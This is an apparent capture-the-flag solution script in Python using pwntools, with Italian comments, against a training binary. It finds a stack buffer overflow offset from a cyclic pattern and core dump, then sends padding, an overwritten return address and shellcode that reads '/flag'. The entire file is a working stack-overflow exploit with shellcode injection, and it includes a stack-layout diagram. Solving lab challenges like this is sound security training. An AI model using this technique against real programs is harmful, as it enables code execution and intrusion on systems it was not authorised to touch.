#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-2-0')

# Calcolo la lunghezza del buffer tramite la stringa ciclica e il coredump
io = elf.process(setuid=False)
io.sendline("512")
io.sendline(cyclic(512,n=8))
io.wait()

buff_len = cyclic_find(io.corefile.fault_addr,n=8)
print(buff_len)

# Faccio ripartire il processo
io = elf.process()

# Leggo l'indirizzo del buffer
io.recvuntil(b"The input buffer begins at 0x")
buff_addr = p64(int(io.recvuntil(b',').decode()[:-1],16))
print(buff_addr)


# Costruisco il payload
# +-----------------+ 0xfff0...
# |        .        |
# |        .        |
# |        .        |
# +-----------------+
# |     0x....      |-----------+
# +-----------------+           |
# | A A A A A A A A |           |
# +-----------------+  <-RBP    |
# | A A A A A A A A |           |
# | A A A A A A A A |           |
# | A A A A A A A A |           |
# +-----------------+           |
# |                 |           |
# |      SHELL      |           |
# |      CODE       |           |
# |                 |           |
# +-----------------+ <---------+
# |        .        |
# |        .        |
# |        .        |
# +-----------------+ 0x0000....
SHELLCODE = asm(shellcraft.cat('/flag'))
PADDING = b'A'*(buff_len-len(SHELLCODE))
print(buff_len-len(SHELLCODE))
buff_addr = b"\xd0\xd6\xff\xff\xff\x7f\x00\x00"
PAYLOAD =  b'A' * 56 + buff_addr + SHELLCODE

# Invio lunghezza e payload e leggo la flag
io.sendline(f"{len(PAYLOAD)}".encode())
io.sendline(PAYLOAD)
io.interactive()
